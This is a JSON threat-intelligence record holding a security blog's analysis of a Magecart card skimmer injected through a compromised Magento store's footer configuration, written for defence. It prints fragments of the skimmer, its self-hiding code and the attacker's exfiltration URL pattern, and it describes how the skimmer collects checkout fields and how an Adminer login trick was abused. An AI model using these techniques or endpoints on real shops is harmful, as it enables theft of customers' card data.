@@ -1,0 +1,55 @@
+{
+    "id": "4f67abf9-f856-41a2-83b7-035ecbb990e8",
+    "created_at": "2023-01-12T15:09:44.784956Z",
+    "updated_at": "2025-03-27T02:10:49.432173Z",
+    "deleted_at": null,
+    "sha1_hash": "9f33ac8c02c1b2e991f33fbf60f5b856772a9acf",
+    "title": "2020-07-11 - Injecting Magecart into Magento Global Config",
+    "authors": "",
+    "file_creation_date": "2022-05-28T00:30:45Z",
+    "file_modification_date": "2022-05-28T00:30:45Z",
+    "file_size": 875907,
+    "plain_text": "# Injecting Magecart into Magento Global Config\n\n**[trustwave.com/en-us/resources/blogs/spiderlabs-blog/injecting-magecart-into-magento-global-config/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/injecting-magecart-into-magento-global-config/)**\n\nAt the beginning of June 2020, we were contacted about a breach of a website using the\nMagento framework that caused a leak of credit card numbers. A thorough analysis of the\nwebsite identified the webpage’s footer had malicious code added to it.\n\nFigure 1. Malicious Script Injected in the Footer Section of the Compromised Magento Webpage\n\nWe found that the Magento's cached CONFIG_GLOBAL_STORES_DEFAULT file also contains\nthe same malicious code.\n\n\n-----\n\nFigure 2. Magento configuration located at /var/cache within Magento installation directory was\nalso infected\n\nOn the compromised web server, we also found an Adminer PHP file – a readily available tool\nused to remotely manage SQL databases such as MySQL. We will get back to this later on why\nthe attacker used this tool.\n\n## Malicious Code Analysis\n\nBefore we proceed on how the malicious code got into the compromised webpage’s footer, let us\nfirst see what the malicious code does.\n\nThe malicious JavaScript code is a very long string, encapsulated inside a <div> HTML element\ntag starting with this code:\n```\n <div style=\"position:fixed;top:0;left:0;width:100%;height:100%;\"\n onmouseover=\"(function (){MALICIOUS JAVASCRIPT TRUNCATED}..\n\n```\nThen a “style” attribute is used to define the <div> element’s position, with 100% width and 100%\nheight. This means that the element covers the entire page's scale and that it will execute the\nmalicious JavaScript once the mouse moves over the webpage.\n\nTowards the end of the string you will see:\n```\n 'var d1;d1 = eval('doc' +\n 'ument');d1.getElementById('qwe123').parentNode.removeChild(d1.getElementById('\n id=\"qwe123\"'\n\n```\nBelow is a breakdown of this code:\n\n\n-----\n\n```\nvar d1;\n\n```\n```\nd1.getElementById('qwe123').parentNode.removeChild(d1.getElementById('qwe123'))\n\n```\n\nwhere:\n\n**getElementById - This method returns the information from the element 'qwe123'**\n\n**parentNode.removeChild - Returns the removed child node from the Document Object Model**\n(DOM) tree but keeps it in the memory, which can will use later\n\nThis piece of code is used to hide itself by removing the whole <div> element encapsulating the\nmalicious JavaScript, after the main malicious JavaScript is executed or attempting to conduct\nlive analysis on the code via something like a browsers Dev mode.\n\nThe bulk of the rest of the code is highly obfuscated. But after de-obfuscating and prettifying the\ncode, we can clearly see what the JavaScript does.\n\nFigure 3. De-obfuscated Javascript encapsulated inside the <DIV> element\n\nThe de-obfuscated code shown in Figure 3 monitors HTML elements including:\n**input, select, form, button. This code is very dangerous especially when injected into a web**\nstore’s check out page. Once a customer enters information into the page and clicks anywhere\nelse, it begins to iterate all of the monitored elements from the HTML form for user inputs. The\ncollected data are then joined together to form one string of URL encoded parameter format. For\nexample:\n\n\n-----\n\nbilling[address_id]=340982&billing[create_new_account]=1%2F&billing[country_id]=United%20S\n&billing[save_in_address_book]=1&billing[use_for_shipping]=1&billing[use_for_shipping]=0&ship\n\n[country_id]=United%20States&shipping[save_in_address_book]=1&shipping_method=cpshippin\n&payment[method]=authorizenet&payment[cc_type]=Visa&payment[cc_number]=41111111111111\n&newsletter=1&grand_total_value=77.98&cart[162000][qty]=1&remove=0&cc=4111111111111111\n\nCredit card data are also checked and validated using the Luhn algorithm and appended in the\nstring as parameter variable “cc”.\n\nFrom this point, collected data is exfiltrated to the attacker's host tunneled through an HTTP GET\nparameter.\n\nhttps://congolo.pro/folder/ip/zxc.php?r=r{random}&{exfiltrated data}&cc={credit card number}\n\n## Footer Infection\n\nSo how did the JavaScript get injected into the webpage’s footer? Short answer, Magento’s\nglobal configuration.\n\nMagento’s global configuration plays an important role in an online store that uses the Magento\nframework. This is where a Magento administrator configures different scopes in the framework,\nincluding catalogs, reports, customer configuration, web theme/design, among others.\n\nHowever, this configuration can be easily manipulated after the webserver gets compromised\n\nThe screenshot below shows Magento’s design configuration page, where an admin can set the\nFooter section of the webpage. The footer specifically defines the Copyright notice. But we can\nalso add a <script> element into this field.\n\nFigure 4. Magento's Design Configuration Page\n\n\n-----\n\nAnd once this is cached by Magento, the copyright notice including the script gets injected to\nevery page of the Magento website:\n\nFigure 5. Copyright notice including the <script> element we added is injected to every page of\nthe website\n\n[We mentioned earlier that the attacker used a SQL management tool called Adminer on the](https://www.adminer.org/)\ncompromised web server. The attacker used adminer.php in the server and pointed it to the\nattacker's own MySQL database. The tool has a vulnerability that allows bypassing the login\nscreen for adminer.php by using the attacker’s database credentials. Once logged in, the attacker\ncan access the compromised webserver’s local database instead of the attacker’s database. The\nattacker then leverages the information gained from the database to access the admin portion of\nthe Magento website. The attacker may then potentially directly access and modify the Magento\nconfiguration from the database.\n\nFigure 6. Using Adminer to edit Magento Configuration\n\n\n-----\n\nHow the web server got compromised is still being investigated. But looking at the access.log, we\nsaw that other individuals had been scanning for iterations of adminer.php both before and after\nthe attack. Also, the customer was using an old version of Magento (specifically version 1.9.4.3)\n[and there are more than a dozen known security vulnerabilities that affect this version.](https://www.cvedetails.com/vulnerability-list/vendor_id-15393/product_id-31613/version_id-279385/Magento-Magento-1.9.4.0.html)\n\n## Conclusion\n\nThis attack shows the relative ease in which a Magento system can be compromised to inject\nmalicious JavaScript into web pages. The only reliable way of preventing Magecart is to detect,\nfix, and harden the security of websites. There are currently a few tools online that can help with\nthese three steps:\n\nDetect/Fix\n\nHarden\n\nAdditional Reading\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-07-11 - Injecting Magecart into Magento Global Config.pdf"
+    ],
+    "report_names": [
+        "2020-07-11 - Injecting Magecart into Magento Global Config.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
+            "created_at": "2023-01-06T13:46:38.814104Z",
+            "updated_at": "2025-03-27T02:00:02.925972Z",
+            "deleted_at": null,
+            "main_name": "MageCart",
+            "aliases": [],
+            "source_name": "MISPGALAXY:MageCart",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536184,
+    "ts_updated_at": 1743041449,
+    "ts_creation_date": 1653697845,
+    "ts_modification_date": 1653697845,
+    "files": {
+        "pdf": "https://archive.orkl.eu/9f33ac8c02c1b2e991f33fbf60f5b856772a9acf.pdf",
+        "text": "https://archive.orkl.eu/9f33ac8c02c1b2e991f33fbf60f5b856772a9acf.txt",
+        "img": "https://archive.orkl.eu/9f33ac8c02c1b2e991f33fbf60f5b856772a9acf.jpg"
+    }
+}
